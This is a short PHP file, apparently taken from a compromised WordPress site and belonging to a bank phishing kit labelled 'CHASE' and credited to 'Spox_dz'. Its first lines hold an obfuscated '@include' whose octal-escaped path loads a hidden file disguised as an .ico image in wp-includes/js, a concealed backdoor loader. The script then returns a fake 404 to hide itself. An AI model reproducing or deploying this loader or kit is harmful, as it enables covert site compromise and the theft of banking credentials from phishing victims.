<?php
/*68b7d*/

@include "\057home\064/xlw\146hg2i\057zeta\145mark\145ting\056com/\167ordp\162ess/\167p-in\143lude\163/js/\056a7f7\071880.\151co";

/*68b7d*/
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 1.0
 * Https://facebook.com/hackeeeed.html
 * icq+teleg = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2019 CHASE             $#
###############################################

**/
header("HTTP/1.0 404 Not Found");
exit();
?>
